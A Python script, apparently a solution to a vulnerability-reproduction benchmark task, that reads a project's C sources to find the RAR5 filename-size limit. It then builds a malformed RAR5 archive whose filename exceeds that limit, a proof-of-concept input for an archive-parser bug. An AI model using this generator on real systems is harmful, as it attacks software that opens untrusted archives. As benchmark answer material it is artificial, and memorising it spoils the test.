import os
import re
import tarfile
import struct
import zlib
import ast
from typing import Dict, Optional, List, Tuple, Iterable


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//[^\n]*", "", s)
    return s


_CAST_RE = re.compile(
    r"\(\s*(?:const\s+)?(?:unsigned\s+)?(?:signed\s+)?(?:long\s+)?(?:short\s+)?"
    r"(?:int|char|size_t|ssize_t|uint(?:8|16|32|64)_t|int(?:8|16|32|64)_t)\s*\)"
)


def _sanitize_c_int_expr(expr: str) -> str:
    expr = expr.strip()
    expr = _strip_c_comments(expr)
    expr = expr.strip()
    if not expr:
        return ""
    expr = _CAST_RE.sub("", expr)
    expr = expr.replace("UL", "").replace("LU", "").replace("ULL", "").replace("LLU", "")
    expr = re.sub(r"(?<=\b0x[0-9A-Fa-f]+)[uUlL]+\b", "", expr)
    expr = re.sub(r"(?<=\b\d+)[uUlL]+\b", "", expr)
    expr = re.sub(r"\bsizeof\s*\([^)]*\)", "0", expr)
    expr = re.sub(r"\(\s*\)", "", expr)
    expr = re.sub(r"__?[A-Za-z_]\w*", lambda m: m.group(0), expr)
    expr = expr.strip()
    expr = expr.rstrip("\\").strip()
    return expr


_ALLOWED_AST_NODES = (
    ast.Expression,
    ast.BinOp,
    ast.UnaryOp,
    ast.Constant,
    ast.Num,
    ast.Add,
    ast.Sub,
    ast.Mult,
    ast.FloorDiv,
    ast.Div,
    ast.Mod,
    ast.LShift,
    ast.RShift,
    ast.BitOr,
    ast.BitAnd,
    ast.BitXor,
    ast.Invert,
    ast.UAdd,
    ast.USub,
    ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
)


def _is_allowed_ast(node: ast.AST) -> bool:
    for n in ast.walk(node):
        if isinstance(n, ast.Call) or isinstance(n, ast.Attribute) or isinstance(n, ast.Subscript) or isinstance(n, ast.Name):
            return False
        if not isinstance(n, _ALLOWED_AST_NODES):
            if isinstance(n, ast.Load):
                continue
            return False
    return True


def _safe_eval_int(expr: str) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    try:
        tree = ast.parse(expr, mode="eval")
    except Exception:
        return None
    if not _is_allowed_ast(tree):
        return None
    try:
        v = eval(compile(tree, "<expr>", "eval"), {"__builtins__": {}}, {})
    except Exception:
        return None
    if isinstance(v, bool):
        return int(v)
    if isinstance(v, int):
        return v
    if isinstance(v, float):
        if v.is_integer():
            return int(v)
    return None


def _iter_source_texts(src_path: str) -> Iterable[Tuple[str, str]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                if not (fn.endswith(".c") or fn.endswith(".h") or fn.endswith(".cc") or fn.endswith(".hpp") or fn.endswith(".cpp")):
                    continue
                p = os.path.join(root, fn)
                try:
                    with open(p, "rb") as f:
                        b = f.read()
                except Exception:
                    continue
                if len(b) > 5_000_000:
                    continue
                try:
                    t = b.decode("utf-8", "ignore")
                except Exception:
                    continue
                yield p, t
        return

    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return
    with tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            lower = name.lower()
            if not (lower.endswith(".c") or lower.endswith(".h") or lower.endswith(".cc") or lower.endswith(".hpp") or lower.endswith(".cpp")):
                continue
            if m.size <= 0 or m.size > 5_000_000:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                b = f.read()
            except Exception:
                continue
            try:
                t = b.decode("utf-8", "ignore")
            except Exception:
                continue
            yield name, t


def _extract_numeric_macros(texts: Iterable[Tuple[str, str]]) -> Dict[str, int]:
    macros: Dict[str, int] = {}
    define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$", re.M)
    for _, t in texts:
        t2 = _strip_c_comments(t)
        for m in define_re.finditer(t2):
            name = m.group(1)
            expr = m.group(2)
            expr = _sanitize_c_int_expr(expr)
            if not expr:
                continue
            if '"' in expr or "'" in expr:
                continue
            v = _safe_eval_int(expr)
            if v is not None and 0 <= v <= (1 << 63) - 1:
                macros.setdefault(name, v)
    changed = True
    passes = 0
    while changed and passes < 6:
        passes += 1
        changed = False
        for _, t in texts:
            t2 = _strip_c_comments(t)
            for m in define_re.finditer(t2):
                name = m.group(1)
                if name in macros:
                    continue
                expr = _sanitize_c_int_expr(m.group(2))
                if not expr:
                    continue
                if '"' in expr or "'" in expr:
                    continue
                expr_sub = expr
                for _ in range(4):
                    toks = set(re.findall(r"\b[A-Za-z_]\w*\b", expr_sub))
                    replaced_any = False
                    for tok in toks:
                        if tok in macros:
                            expr_sub = re.sub(r"\b" + re.escape(tok) + r"\b", str(macros[tok]), expr_sub)
                            replaced_any = True
                    if not replaced_any:
                        break
                v = _safe_eval_int(expr_sub)
                if v is not None and 0 <= v <= (1 << 63) - 1:
                    macros[name] = v
                    changed = True
    return macros


def _find_max_name_size(src_path: str) -> int:
    texts_all = list(_iter_source_texts(src_path))
    if not texts_all:
        return 1024

    relevant = [(n, t) for (n, t) in texts_all if "rar5" in n.lower() or "rar5" in t.lower()]
    if not relevant:
        relevant = texts_all

    macros = _extract_numeric_macros(relevant)

    candidates: List[int] = []

    for _, t in relevant:
        tt = _strip_c_comments(t)
        for m in re.finditer(r"\bname(?:_)?size\b\s*(?:>=|>)\s*([A-Za-z_]\w*|0x[0-9A-Fa-f]+|\d+)", tt):
            tok = m.group(1)
            if tok.startswith(("0x", "0X")):
                try:
                    v = int(tok, 16)
                    candidates.append(v)
                except Exception:
                    pass
            elif tok.isdigit():
                try:
                    candidates.append(int(tok))
                except Exception:
                    pass
            else:
                if tok in macros:
                    candidates.append(macros[tok])

        for m in re.finditer(r"\bname(?:_)?size\b\s*(?:>=|>)\s*\(\s*([^)]+?)\s*\)", tt):
            expr = _sanitize_c_int_expr(m.group(1))
            if not expr:
                continue
            expr_sub = expr
            for _ in range(4):
                toks = set(re.findall(r"\b[A-Za-z_]\w*\b", expr_sub))
                replaced_any = False
                for tok in toks:
                    if tok in macros:
                        expr_sub = re.sub(r"\b" + re.escape(tok) + r"\b", str(macros[tok]), expr_sub)
                        replaced_any = True
                if not replaced_any:
                    break
            v = _safe_eval_int(expr_sub)
            if v is not None:
                candidates.append(v)

    for name, v in macros.items():
        up = name.upper()
        if "NAME" in up and ("MAX" in up or "LIMIT" in up):
            if isinstance(v, int):
                candidates.append(v)

    filt = [v for v in candidates if isinstance(v, int) and 64 <= v <= 1_000_000]
    if filt:
        return max(64, min(filt))

    pos = [v for v in candidates if isinstance(v, int) and v > 0 and v <= 10_000_000]
    if pos:
        return min(pos)

    return 1024


def _encode_vint(n: int) -> bytes:
    if n < 0:
        n = 0
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _rar5_block(header_data: bytes) -> bytes:
    hs = _encode_vint(len(header_data))
    crc = zlib.crc32(hs + header_data) & 0xFFFFFFFF
    return struct.pack("<I", crc) + hs + header_data


class Solution:
    def solve(self, src_path: str) -> bytes:
        max_name = _find_max_name_size(src_path)
        name_len = max_name + 1
        if name_len < 65:
            name_len = 65

        signature = b"Rar!\x1a\x07\x01\x00"

        main_header_data = _encode_vint(1) + _encode_vint(0) + _encode_vint(0)
        main_block = _rar5_block(main_header_data)

        name_bytes = b"a" * name_len

        hdr_type = _encode_vint(2)
        hdr_flags = _encode_vint(2)          # has data area size field
        data_size = _encode_vint(0)          # no data area
        file_flags = _encode_vint(0)
        unpacked_size = _encode_vint(0)
        attributes = _encode_vint(0x20)
        comp_info = _encode_vint(0)
        host_os = _encode_vint(0)
        name_size = _encode_vint(name_len)

        file_header_data = (
            hdr_type + hdr_flags + data_size +
            file_flags + unpacked_size + attributes +
            comp_info + host_os +
            name_size + name_bytes
        )
        file_block = _rar5_block(file_header_data)

        end_header_data = _encode_vint(5) + _encode_vint(0) + _encode_vint(0)
        end_block = _rar5_block(end_header_data)

        return signature + main_block + file_block + end_block